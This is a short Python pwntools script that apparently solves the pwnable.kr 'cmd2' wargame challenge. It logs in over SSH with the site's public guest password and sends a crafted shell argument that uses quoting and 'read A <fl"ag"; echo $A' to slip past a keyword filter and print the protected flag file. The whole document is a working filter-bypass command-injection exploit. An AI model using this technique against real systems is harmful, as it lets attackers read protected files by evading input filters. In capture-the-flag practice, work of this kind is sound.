from pwn import * 




s = ssh(user="cmd2",host="pwnable.kr",port=2222,password="guest")

sh = s.shell("nc 0 10013")
sh.recv()

sh.sendline(b"./cmd2 'read A <fl\"ag\"; echo $A'")
print(sh.recv().decode())

